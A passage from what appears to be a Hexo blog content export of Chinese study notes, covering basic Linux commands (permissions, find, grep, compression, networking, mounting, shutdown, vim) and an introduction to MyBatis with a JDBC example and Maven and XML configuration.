<li>删除文件必须在<strong>文件所在目录</strong>有w权限</li>
</ul>
<h5 id="2-2-改变所有者"><a href="#2-2-改变所有者" class="headerlink" title="2.2 改变所有者"></a>2.2 改变所有者</h5><blockquote>
<p>chown </p>
<p>语法： chown[用户] [文件或目录]</p>
<p>功能：改变文件或目录的所有者</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012220606717.png" alt="image-20201012220606717" style="zoom:80%;" />

<h5 id="2-3-改变组名"><a href="#2-3-改变组名" class="headerlink" title="2.3 改变组名"></a>2.3 改变组名</h5><blockquote>
<p>chgrp 功能：改变组名</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012221249409.png" alt="image-20201012221249409" style="zoom:80%;" />

<h5 id="2-4-缺省权限"><a href="#2-4-缺省权限" class="headerlink" title="2.4 缺省权限"></a>2.4 缺省权限</h5><blockquote>
<p>umask 语法：umask[-S] </p>
<p>​                        -S以rwx形式显示新建文件缺省权限 </p>
<p>​                        默认为022 </p>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012223216078.png" alt="image-20201012223216078" style="zoom:80%;" />

<p>功能：显示、设置文件的缺省权限</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012223943522.png" alt="image-20201012223943522" style="zoom:80%;" />

<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012223429003.png" alt="image-20201012223429003" style="zoom:80%;" /><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012224220851.png" alt="image-20201012224220851"></p>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012224249302.png" alt="image-20201012224249302" style="zoom:80%;" />

<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012222757643.png" alt="image-20201012222757643" style="zoom: 80%;" />

<p><strong>默认新建的文件不具有执行x权限</strong></p>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012221852338.png" alt="image-20201012221852338" style="zoom:80%;" />



<h4 id="3、文件搜索命令"><a href="#3、文件搜索命令" class="headerlink" title="3、文件搜索命令"></a>3、文件搜索命令</h4><h5 id="3-1-find"><a href="#3-1-find" class="headerlink" title="3.1 find"></a>3.1 find</h5><blockquote>
<p><strong>find 对系统负载高</strong></p>
<p>语法：find [搜索范围] [匹配条件] [搜索内容]</p>
<p>功能：文件精准搜索</p>
<ul>
<li>-name 根据文件名<ul>
<li>-iname 不区分大小写</li>
</ul>
</li>
<li>-size 根据文件大小(1数据块==512字节==0.5k)<ul>
<li>+n 大于 -n小于 =等于</li>
</ul>
</li>
<li>-user 根据所有者</li>
<li>-group 根据所属组</li>
<li>-type 文件类型 f文件 d目录 l链接</li>
<li>-inum 根据i节点查找</li>
</ul>
</blockquote>
<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013101128989.png" alt="image-20201013101128989"></p>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013115930522.png" alt="image-20201013115930522" style="zoom:80%;" />

<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013143924192.png" alt="image-20201013143924192" style="zoom:80%;" />

<blockquote>
<ul>
<li>-amin 访问时间access</li>
<li>-cmin 文件属性change</li>
<li>-mmin 文件内容modify</li>
</ul>
<blockquote>
<p>find /etc -cmin -5(分钟)</p>
</blockquote>
</blockquote>
<p><strong>逻辑搜索</strong></p>
<blockquote>
<ul>
<li><p>-a 俩个条件都满足</p>
</li>
<li><p>-o 满足一个</p>
</li>
</ul>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013135912911.png" alt="image-20201013135912911" style="zoom:80%;" />

<p><strong>搜索同时ls</strong></p>
<blockquote>
<ul>
<li>-exec ls -l {} ;</li>
<li>-ok  ls -l {} ;</li>
</ul>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013140333410.png" alt="image-20201013140333410" style="zoom:80%;" />



<h5 id="3-2-其他"><a href="#3-2-其他" class="headerlink" title="3.2 其他"></a>3.2 其他</h5><h6 id="locate"><a href="#locate" class="headerlink" title="locate"></a>locate</h6><blockquote>
<p>路径 /usr/bin/locate  </p>
<p>语法: locate 文件名  功能：在<strong>文件资料库</strong>中查找文件</p>
<p>ps: 资料库是定时更新的(/tmp目录下文件不会更新到资料库),<code>updatedb</code>更新命令</p>
</blockquote>
<h6 id="which"><a href="#which" class="headerlink" title="which"></a>which</h6><blockquote>
<p>路径 /usr/bin/which  所有用户可以使用</p>
<p>功能： 搜索命令所在目录及<strong>别名信息</strong></p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013163455860.png" alt="image-20201013163455860" style="zoom:80%;" />

<h6 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h6><blockquote>
<p>语法：whereis[命令名称] </p>
<p>功能:搜索命令所在目录及<strong>帮助文档路径</strong></p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013163836339.png" alt="image-20201013163836339" style="zoom:80%;" />



<h6 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h6><blockquote>
<p>路径：/bin/grep</p>
<p>语法：grep -iv [指定字串] [文件]</p>
<p>功能：<strong>在文件内搜寻字串匹配的行并输出</strong></p>
<ul>
<li>-i 不区分大小写</li>
<li>-v 排除指定字串(屏蔽所在的行)</li>
</ul>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013164127582.png" alt="image-20201013164127582" style="zoom:80%;" />



<h4 id="4、帮助命令"><a href="#4、帮助命令" class="headerlink" title="4、帮助命令"></a>4、帮助命令</h4><h5 id="man"><a href="#man" class="headerlink" title="man"></a>man</h5><blockquote>
<p>路径 /usr/bin/man</p>
<p>语法：man [<strong>命令或配置文件</strong>] (<strong>不能加上绝对路径</strong>)</p>
<p>功能：获得帮助信息</p>
<ul>
<li>man ls 查看ls命令的帮助信息(NAME存放信息 /选项)</li>
<li>man services 查看配置文件services的帮助信息(NAME存放信息 文件格式)</li>
</ul>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013170052757.png" alt="image-20201013170052757" style="zoom:80%;" />



<h5 id="info"><a href="#info" class="headerlink" title="info"></a>info</h5><h5 id="help"><a href="#help" class="headerlink" title="help"></a>help</h5><blockquote>
<p>功能：获得Shell内置命令的帮助信息</p>
</blockquote>
<h4 id="5、用户管理命令"><a href="#5、用户管理命令" class="headerlink" title="5、用户管理命令"></a>5、用户管理命令</h4><blockquote>
<p>useradd</p>
<p>/usr/sbin/useradd  权限：root</p>
<p>功能：添加新用户</p>
</blockquote>
<blockquote>
<p>passwd </p>
<p>/usr/bin/passwd</p>
<p>功能：更改密码</p>
</blockquote>
<blockquote>
<p>who</p>
<p>/usr/bin/who</p>
<p>功能：查看登录用户信息</p>
<p>tty本地终端/pts远程终端  登录时间 </p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013171801669.png" alt="image-20201013171801669" style="zoom:80%;" />

<blockquote>
<p>w</p>
<p>功能：查看登录用户的详细信息</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013171923727.png" alt="image-20201013171923727" style="zoom:80%;" />



<h4 id="6、压缩和解压命令"><a href="#6、压缩和解压命令" class="headerlink" title="6、压缩和解压命令"></a>6、压缩和解压命令</h4><blockquote>
<p>.zip在windows和linux都可以</p>
</blockquote>
<h5 id="6-1-gzip"><a href="#6-1-gzip" class="headerlink" title="6.1 gzip"></a>6.1 gzip</h5><blockquote>
<p>路径 /bin/gzip </p>
<p>权限：所有用户</p>
<p>语法 gzip[文件]  </p>
<p>功能：<strong>只能压缩文件，不能压缩目录，不保留原文件</strong></p>
<p>压缩格式：.gz</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013174552682.png" alt="image-20201013174552682" style="zoom:80%;" />

<blockquote>
<p>gunzip/ gzip -d 功能:解压缩</p>
</blockquote>
<h5 id="6-2-tar"><a href="#6-2-tar" class="headerlink" title="6.2 tar"></a>6.2 tar</h5><blockquote>
<p>tar 路径 /bin/tar</p>
<p>语法： tar 选项[-zcf] <strong>[压缩后文件名]</strong> [目录]</p>
<ul>
<li>-c 打包</li>
<li>-v 显示详细信息</li>
<li>-f 指定文件名</li>
<li>-z 打包同时压缩</li>
</ul>
<p>功能：打包目录，<strong>保留原文件</strong></p>
<p>文件格式：.tar.gz</p>
</blockquote>
<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013175548070.png" alt="image-20201013175548070" style="zoom:80%;" /><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013175639950.png" alt="image-20201013175639950"></p>
<blockquote>
<p>tar 解包</p>
<ul>
<li>-x 解包</li>
<li>-z 解压缩</li>
<li>-f 指定解压文件</li>
<li>-v 显示详细信息</li>
</ul>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013180032803.png" alt="image-20201013180032803" style="zoom:80%;" />

<h5 id="6-3-zip"><a href="#6-3-zip" class="headerlink" title="6.3 zip"></a>6.3 zip</h5><blockquote>
<p>路径 /usr/bin/zip</p>
<p>语法：zip 选项[-r] [压缩后文件名] [文件或目录]</p>
<p>​            -r 压缩目录</p>
<p>语法：压缩文件或目录   压缩后格式：.zip</p>
<ul>
<li><strong>能保留原文件</strong></li>
</ul>
</blockquote>
<blockquote>
<p>unzip 功能：解压.zip的压缩文件</p>
</blockquote>
<h5 id="6-4-bzip2"><a href="#6-4-bzip2" class="headerlink" title="6.4 bzip2"></a>6.4 bzip2</h5><blockquote>
<p>bzip2 路径： /usr/bin/bzip2</p>
<p>语法：bzip2 选项[-k] [文件]</p>
<p>​                        -k 产生压缩文件后保留原文件</p>
<p>格式  .bz2   功能：压缩文件</p>
<p><code>bzip2 -k bodu</code></p>
</blockquote>
<blockquote>
<p>目录的压缩</p>
<p><strong>选项：-j</strong></p>
<ul>
<li>配合tar打包：<code>tar -cjf Japan.tar.bz2 Japan</code></li>
<li>解压：<code>tar -xjf -k Japan.tar.bz2</code></li>
</ul>
</blockquote>
<blockquote>
<p>bunzip2  功能：解压 .bz2文件</p>
</blockquote>
<h4 id="7、网络命令"><a href="#7、网络命令" class="headerlink" title="7、网络命令"></a>7、网络命令</h4><h5 id="7-1-会话"><a href="#7-1-会话" class="headerlink" title="7.1 会话"></a>7.1 会话</h5><blockquote>
<p>write  用户名</p>
<p>路径： /usr/bin/write</p>
<p>功能：给用户发信息，（Ctrl+D保存结束）</p>
</blockquote>
<blockquote>
<p>crtl+alt+f1 切换用户</p>
</blockquote>
<blockquote>
<p>wall 功能：发广播信息</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013225705334.png" alt="image-20201013225705334" style="zoom:80%;" />

<blockquote>
<p>ping 功能：测试网络连通性</p>
<p>语法: ping 选项 Ip地址</p>
<p>​        -c 指定发送次数   （ctrl+c停止）</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014000802771.png" alt="image-20201014000802771" style="zoom:80%;" />

<blockquote>
<p>ifconfig  路径：/sbin/ifconfig</p>
<p>权限：root 语法：ifconfig 网卡名称  IP地址</p>
<p>功能：查看和设置网卡信息</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014000345718.png" alt="image-20201014000345718" style="zoom:80%;" />

<blockquote>
<p>mail  路径 /bin/mail</p>
<p>语法：mail [用户名]  功能：<strong>查看发送电子邮件</strong></p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013231948397.png" alt="image-20201013231948397" style="zoom:80%;" />

<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013232046831.png" alt="image-20201013232046831" style="zoom:80%;" />

<h5 id="7-2-用户"><a href="#7-2-用户" class="headerlink" title="7.2 用户"></a>7.2 用户</h5><blockquote>
<p>last  功能：列出目前与过去登入系统的用户</p>
<p>lastlog 功能：列出所有用户以及最后登录信息</p>
<ul>
<li>last -u 用户uid</li>
</ul>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013232312403.png" alt="image-20201013232312403" style="zoom:80%;" />

<blockquote>
<p>traceroute 功能：显示数据包到主机间的路径</p>
</blockquote>
<blockquote>
<p>netstat 语法：netstat[选项]  </p>
<p>功能：显示网络相关信息</p>
<ul>
<li>-t  TCP协议</li>
<li>-u UDP协议</li>
<li>-l  监听</li>
<li>-r  路由</li>
<li>-n  显示ip地址和端口号</li>
</ul>
<p>ps： netstat -tlun 查看本机监听的端口</p>
<p>​        netstat -an 查看本机所有的网络连接</p>
<p>​        netstat -rn 查看本机路由器</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014000308056.png" alt="image-20201014000308056" style="zoom:80%;" />

<blockquote>
<p>setup 权限：root  </p>
<p>功能：配置网络</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014000225061.png" alt="image-20201014000225061" style="zoom:80%;" />

<h5 id="7-3-挂载命令"><a href="#7-3-挂载命令" class="headerlink" title="7.3 挂载命令"></a>7.3 挂载命令</h5><blockquote>
<p>mount 权限：所有用户</p>
<p>语法：mount[-t 文件系统] 设备文件名 挂载点</p>
<p><strong>类似windows分配盘符</strong></p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013235723511.png" alt="image-20201013235723511" style="zoom:80%;" />

<blockquote>
<p>umount 功能：卸载</p>
</blockquote>
<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201013235939526.png" alt="image-20201013235939526"></p>
<h4 id="8、关机重启命令"><a href="#8、关机重启命令" class="headerlink" title="8、关机重启命令"></a>8、关机重启命令</h4><blockquote>
<p>shutdown [选项] 时间</p>
<p>​                    -c 取消前一个关机命令</p>
<p>​                    -h 关机</p>
<p>​                    -r  重启</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014073819226.png" alt="image-20201014073819226" style="zoom:80%;" />

<p><strong>系统运行级别</strong></p>
<blockquote>
<p>0 关机   1 单用户(类似windows安全模式root)  </p>
<p>2 不完全多用户，不含NFS服务(网络文件系统(俩个linux文件共享，有安全隐患))   3 完全多用户  </p>
<p>4 未分配    5 图形界面   6重启</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014074814868.png" alt="image-20201014074814868" style="zoom:80%;" />

<blockquote>
<p>logout 退出登录</p>
</blockquote>
<h4 id="9、显示当前线程"><a href="#9、显示当前线程" class="headerlink" title="9、显示当前线程"></a>9、显示当前线程</h4><p><strong>ps -ef</strong> #用标准的格式显示进程</p>
<h3 id="三、Vim编辑器"><a href="#三、Vim编辑器" class="headerlink" title="三、Vim编辑器"></a>三、Vim编辑器</h3><blockquote>
<p>作用：<strong>建立、编辑、显示文本文件</strong></p>
<p>Vim没有菜单，只有命令</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014092643584.png" alt="image-20201014092643584" style="zoom:80%;" />

<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014093455541.png" alt="image-20201014093455541" style="zoom:80%;" />

<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014093508345.png" alt="image-20201014093508345" style="zoom:80%;" />

<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014193737239.png" alt="image-20201014193737239" style="zoom:80%;" />

<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201014194101704.png" alt="image-20201014194101704" style="zoom:80%;" />

<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201015083655954.png" alt="image-20201015083655954" style="zoom:80%;" />

<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201015083904770.png" alt="image-20201015083904770" style="zoom:80%;" /><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201015084245455.png" alt="image-20201015084245455" style="zoom:80%;" /></p>
<ul>
<li><p>连续行注释 <code>：1(开始行)，2(结束行)s/^(行首)/#(注释符号)/g(确认？)</code></p>
<ul>
<li><code>1,4s/^#//g</code>     去除行首#</li>
<li>1，4s/^////g :（\转义符号</li>
</ul>
</li>
<li><p>替换：:ab x1 x2。可以用x1代替x2显示</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis</title>
    <url>/2020/11/25/03Mybatis/</url>
    <content><![CDATA[<h1 id="Mybatis简介"><a href="#Mybatis简介" class="headerlink" title="Mybatis简介"></a>Mybatis简介</h1><p>基于Java的持久层框架，还有封装程度更高的框架Hibernate</p>
<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>mybatis 是一个优秀的基于 java 的持久层框架，它<strong>内部封装了 jdbc</strong>，使开发者只需要关注 sql 语句本身， 而不需要花费精力去处理加载驱动、创建连接、创建 statement 等繁杂的过程。 </p>
<p>mybatis 通过 <strong>xml 或注解</strong>的方式将要执行的各种 statement 配置起来，并通过 java 对象和 statement 中 sql 的动态参数进行映射生成最终执行的 sql 语句，最后由 mybatis 框架执行 sql 并将<strong>结果</strong>映射为 java 对象并 返回。 </p>
<p>采用 <strong>ORM</strong> 思想解决了实体和数据库映射的问题，对 jdbc 进行了封装，屏蔽了 jdbc api 底层访问细节，使我 们不用与 jdbc api 打交道，就可以完成对数据库的持久化操作。</p>
<h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Connection connection = <span class="keyword">null</span>;</span><br><span class="line">    PreparedStatement preparedStatement = <span class="keyword">null</span>;</span><br><span class="line">    ResultSet resultSet = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//加载数据库驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//通过驱动管理类获取数据库链接</span></span><br><span class="line">        connection = DriverManager</span><br><span class="line">       .getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?characterEncoding=utf-8&quot;</span>,<span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">        <span class="comment">//定义 sql 语句 ?表示占位符</span></span><br><span class="line">        String sql = <span class="string">&quot;select * from user where username = ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取预处理 statement</span></span><br><span class="line">        preparedStatement = connection.prepareStatement(sql);</span><br><span class="line">        <span class="comment">//设置参数，第一个参数为 sql 语句中参数的序号（从 1 开始），第二个参数为设置的</span></span><br><span class="line">        参数值</span><br><span class="line">        preparedStatement.setString(<span class="number">1</span>, <span class="string">&quot;王五&quot;</span>);</span><br><span class="line">        <span class="comment">//向数据库发出 sql 执行查询，查询出结果集</span></span><br><span class="line">        resultSet = preparedStatement.executeQuery();</span><br><span class="line">        <span class="comment">//遍历查询结果集</span></span><br><span class="line">        <span class="keyword">while</span>(resultSet.next())&#123;</span><br><span class="line">             System.out.println(resultSet.getString(<span class="string">&quot;id&quot;</span>)+<span class="string">&quot;</span></span><br><span class="line"><span class="string">             &quot;</span>+resultSet.getString(<span class="string">&quot;username&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    	e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">        <span class="comment">//释放资源</span></span><br><span class="line">        <span class="keyword">if</span>(resultSet!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	resultSet.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">        	e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preparedStatement!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            preparedStatement.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">        	e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(connection!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>存在的问题</strong></p>
<p>1、数据库链接创建、释放频繁造成系统资源浪费从而影响系统性能，如果使用数据库链接池可解决此问题。 </p>
<p>2、Sql 语句在代码中硬编码，造成代码不易维护，实际应用 sql 变化的可能较大，sql 变动需要改变 java 代码。 </p>
<p>3、使用 preparedStatement 向占有位符号传参数存在硬编码，因为 sql 语句的 where 条件不一定，可能 多也可能少，修改 sql 还要修改代码，系统不易维护。 </p>
<p>4、对结果集解析存在硬编码（查询列名），sql 变化导致解析代码变化，系统不易维护，如果能将数据库记 录封装成 pojo 对象解析比较方</p>
<a id="more"></a>

<h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><h2 id="基于xml与mapper接口"><a href="#基于xml与mapper接口" class="headerlink" title="基于xml与mapper接口"></a>基于xml与mapper接口</h2><p><strong>依赖maven</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- spring整合mybatis --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis-spring --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>配置文件mybatis.conf</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--改变MyBatis运行时行为--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        开启赖加载功能--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;lazyLoadingEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        关闭积极的懒加载 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;aggressiveLazyLoading&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        二级缓存--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    自定义别名 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        单个别名定义--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">type</span>=<span class="string">&quot;dm.demo.project.pojo.User&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;user&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--配置mybatis的环境--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   配置mysql的环境--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            配置事务的类型--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            配置连接数据库的信息，用的是数据源(连接池)--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span></span></span><br><span class="line"><span class="tag">                          <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/spring1?characterEncoding=utf-8<span class="symbol">&amp;amp;</span>useSSL=false&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;86795462m&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    映射器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mappers/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mappers/OrdersMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>映射配置UserMapper.xml</strong></p>
